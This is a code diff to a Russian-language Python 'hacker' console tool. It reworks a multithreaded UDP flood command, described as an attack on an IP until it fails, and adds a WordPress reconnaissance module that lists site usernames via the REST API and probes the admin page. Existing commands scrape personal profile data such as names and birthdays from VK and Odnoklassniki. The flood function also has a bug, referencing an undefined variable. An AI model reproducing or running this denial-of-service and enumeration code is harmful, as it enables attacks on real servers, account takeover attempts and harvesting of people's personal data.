@@ -1,6 +1,9 @@
 from colorama import init
 from colorama import Fore, Back, Style
+from pystyle import Colors, Colorate
+import pystyle
 import time
+import datetime
 import os
 import requests
 from bs4 import BeautifulSoup
@@ -9,6 +12,9 @@ import socket
 import threading
 import webbrowser
 import lxml
+import sys
+import builtwith
+import json
 
 init(autoreset=True)
 
@@ -128,28 +134,104 @@ def okparsing():
             file.write('URL: ' + url + '\nПользователь: ' + name.text + '\nДата рождения: ' + birthday.text + '\nКоличество друзей: ' + friends.text + '\nКоличество групп: ' + groups.text + '\nКоличество фотографий: ' + photo.text + '\nКоличество игр: ' + games.text)
             file.close()
 
-def ddos(ip, port, times):
+def launchudp(ip, port, thread, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(thread)):
+        try:
+            thd = threading.Thread(target=attackudp, args=(ip, port, until))
+            thd.start()
+        except:
+            pass
+
+def attackudp(ip, port, until_datetime):
     data = random._urandom(1024)
-    while True:
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         i = random.choice(('[*]', '[!]', '[#]'))
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             addr = (str(ip), int(port))
-            for x in range(times):
+            for x in range(t):
                 s.sendto(data, addr)
-            print(i + ' Sent!')
+                print(Fore.GREEN + i + ' Отправлено!')
         except:
-            print('[@] Error!')
+            print(Fore.RED + '[@] Ошибка!')
 
+def UrlTools(Url):
+    if Url.lower().startswith('https://') or Url.lower().startswith('http://'):
+        Url = Url.replace('http://','').replace('https://','')
+    return Url
+
+def getusernamewordpress(Url):
+    Headers = {
+    'Accept':'*/*',
+    'Content-Type':'application/x-www-form-urlencoded',
+    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+    }
+    r = requests.get(Url+'/wp-json/wp/v2/users/',headers=Headers).text
+    j = json.loads(r)
+    Count = len(j) - 1
+    cn = 0
+    User = ''
+    for Val in j:
+        Split = '\n'
+        if Count == cn:
+            Split = ''
+        U = j[cn]['slug']
+        if not U == '':
+            User += Fore.GREEN + '   ' + '[+] ' + U + Split
+        cn += 1
+    if User == '':
+        User = Fore.RED + 'Не найдено!'
+    return User
+
+def adminpage(Url):
+    r = requests.get(Url+'/wp-admin',allow_redirects=False)
+    AdminPageuRL = ''
+    if r.status_code == 200:
+        AdminPageuRL = Fore.RED + 'Не найдено!'
+    elif r.status_code == 301:
+        AdminPageuRL = Fore.GREEN + '   ' + Url +'/wp-admin'
+    return AdminPageuRL
+
+def infoaboutwebsite(Url):
+    B = builtwith.parse(Url)
+    Last = ''
+    for N in B:
+        Last = N
+    Info = ''
+    Count = 0
+    for Name in B:
+        Count = len(B[Name]) -1
+        Values = ''
+        for Value in B[Name]:
+            Split = ' | '
+            if Value == B[Name][Count]:
+                Split = ''
+            Values += Value+Split
+        if Name == Last:
+            Info += Fore.GREEN + '   ' + '[+]'+Name.replace('-','').title()+': '+Values
+        else:
+            Info += Fore.GREEN + '   '+'[+]'+Name.replace('-',' ').title()+': '+Values+'\n'
+
+    return Info
+
+def wordpressgetinfo(Target):
+    Url = UrlTools(Target).title()
+    Ip = socket.gethostbyname(Url)
+    Username = Fore.YELLOW + '[+] '+'Пользователи: \n' + getusernamewordpress('http://' + Url)
+    AdminpageUrl = Fore.YELLOW + '[+] '+'Админка: \n' + adminpage('http://' + Url)
+    Infowebsite = Fore.YELLOW + '[+] '+'Информация: \n' + infoaboutwebsite('http://' + Url)
+    print(Fore.RED + 'Домен: ' + Url + '\nIP: ' + Ip + '\n' + Infowebsite + '\n' + Username + '\n' + AdminpageUrl)
+    
 
 art()
 
 while True:
     time.sleep(1.25)
-    start = input('''
+    start = input(Colorate.Horizontal(Colors.purple_to_red, '''
     
     ╔═══[root@Hacker]
-    ╚══> ''')
+    ╚══> ''', 1))
     if start == 'help':
         print(Fore.GREEN + '''
 		$ checkhost - проверка хоста на работоспособность
@@ -158,6 +240,7 @@ while True:
 		$ vkpasrser - парсинг данных с ВКонтакте
 		$ okparser - парсинг данных с одноклассников
 		$ udpflood - атака на IP до отказа (UDP)
+		$ wordpress - информация о CMS Wordpress
 		$ clear - очистка консоли
 		''')
         pass
@@ -177,14 +260,16 @@ while True:
         os.system('cls')
         ip = str(input('IP: '))
         port = int(input('Port: '))
-        threadspg = int(input('Threads: '))
-        times = int(input('Times: '))
-        for y in range(threadspg):
-            th = threading.Thread(target = ddos(ip, port, times))
-            th.start()
+        thread = int(input('Thread: '))
+        t = int(input('Times: '))
+        launchudp(ip, port, thread, t)
     if start == 'tiktokparser':
         os.system('cls')
         tiktokparsing()
     if start == 'vkparser':
         os.system('cls')
         vkparsing()
+    if start == 'wordpress':
+        os.system('cls')
+        Target = str(input('URL: '))
+        wordpressgetinfo(Target)
